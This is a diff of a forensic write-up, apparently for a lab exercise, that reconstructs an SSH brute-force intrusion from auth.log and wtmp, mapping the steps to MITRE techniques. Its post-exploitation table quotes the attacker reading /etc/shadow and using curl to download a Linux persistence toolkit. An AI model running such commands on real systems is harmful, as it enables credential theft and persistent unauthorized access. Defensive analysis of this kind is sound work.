@@ -51,7 +51,8 @@ cat wtmp.out | grep 65.2.161.68
 
 First look at the log: mostly routine `cron` sessions for the `confluence` service account, which gives a clean baseline to spot anomalies against.
 
-![Baseline auth.log](images/01-baseline-auth-log.png)
+<img width="1329" height="602" alt="01-baseline-auth-log" src="https://github.com/user-attachments/assets/bb9b4ba4-82dd-4f07-a869-22c3451b1df1" />
+
 
 ---
 
@@ -61,8 +62,10 @@ First look at the log: mostly routine `cron` sessions for the `confluence` servi
 
 A burst of `Invalid user` and `Failed password` entries from a single IP, all within a few seconds. No human types credentials that fast, which points to automation (Hydra, Medusa or similar). The server even began throttling connections (`MaxStartups`) and dropped 21 of them.
 
-![Invalid user burst](images/02-bruteforce-invalid-user.png)
-![Failed password burst](images/03-bruteforce-failed-password.png)
+<img width="1259" height="632" alt="02-bruteforce-invalid-user" src="https://github.com/user-attachments/assets/8abfd695-4be1-46fc-ba66-8313843e16b3" />
+
+<img width="1028" height="306" alt="03-bruteforce-failed-password" src="https://github.com/user-attachments/assets/4eb245e3-16cc-406c-be75-90c6b94fcaf2" />
+
 
 Confirmed against the raw log:
 
@@ -77,19 +80,22 @@ Confirmed against the raw log:
 
 At **06:31:40** the log shows `Accepted password for root` from the attacker IP. The session (ID 34) opens and closes in the **same second**, so it was the tool confirming a valid credential, not a person using it.
 
-![Tool-based root login](images/04-tool-login-root-0631.png)
+<img width="1038" height="272" alt="04-tool-login-root-0631" src="https://github.com/user-attachments/assets/270cf065-1dc3-4d14-8b5d-295a2291894a" />
+
 
 ### 3.3 Manual login (T1021.004)
 
 At **06:32:44** the attacker returns with the valid password and logs in by hand, with a new session (ID **37**).
 
-![Manual root login](images/05-manual-login-root-0632.png)
+<img width="1107" height="216" alt="05-manual-login-root-0632" src="https://github.com/user-attachments/assets/66cc1306-62f7-4de4-a7dc-717826b5b343" />
+
 
 `auth.log` records when the password was accepted. `wtmp` records when the **interactive terminal** was actually created, so it is the better source for "when did they start working":
 
 The session ID is read from the `systemd-logind` line right after `session opened`:
 
-![Session 37](images/07-session-37.png)
+<img width="698" height="94" alt="07-session-37" src="https://github.com/user-attachments/assets/8bb6c195-bd1f-4258-bce8-83a6dbae3420" />
+
 
 ### 3.4 Persistence: backdoor account (T1136.001, T1098.007)
 
@@ -103,19 +109,22 @@ Inside the root session the attacker created a group and user, set a password, f
 06:35:15  usermod   add 'cyberjunkie' to group 'sudo'
 ```
 
-![useradd and usermod](images/08-useradd-usermod.png)
+<img width="1283" height="240" alt="08-useradd-usermod" src="https://github.com/user-attachments/assets/e9b94b4f-b9b4-43b0-b671-157e8c1b46ca" />
+
 
 The `from=/dev/pts/1` field on the `useradd` line ties the command to the attacker's terminal from 3.3.
 
 Mapping to MITRE: the account is local to the host, so the sub-technique is **T1136.001 Create Account: Local Account**.
 
-![MITRE T1136 sub-techniques](images/09-mitre-t1136-001.png)
+<img width="546" height="355" alt="09-mitre-t1136-001" src="https://github.com/user-attachments/assets/ca35871b-9b0d-4af4-b7bc-e988d9963bae" />
+
 
 ### 3.5 First session ends
 
 The root session 37 closed at **06:37:24**, after about 4 minutes 40 seconds.
 
-![Session 37 closed](images/10-session-37-closed.png)
+<img width="986" height="103" alt="10-session-37-closed" src="https://github.com/user-attachments/assets/9c037815-a0c4-4848-85b0-3ffe55ccdba4" />
+
 
 ### 3.6 Post-exploitation as the backdoor user (T1003.008, T1105)
 
@@ -126,7 +135,8 @@ Ten seconds later (**06:37:34**) the attacker logs in as `cyberjunkie` (session 
 | 06:37:57 | `/usr/bin/cat /etc/shadow` | Dump password hashes |
 | 06:39:38 | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` | Download `linper.sh`, a Linux persistence toolkit |
 
-![sudo commands](images/11-sudo-commands.png)
+<img width="1275" height="337" alt="11-sudo-commands" src="https://github.com/user-attachments/assets/9b7213f4-2451-410b-9985-0f14fb74093a" />
+
 
 > The log proves the script was **downloaded**. It does not show it being executed or saved, so I make no claim about that. Shell history and file-system timelines would be the next artifacts to check.
 
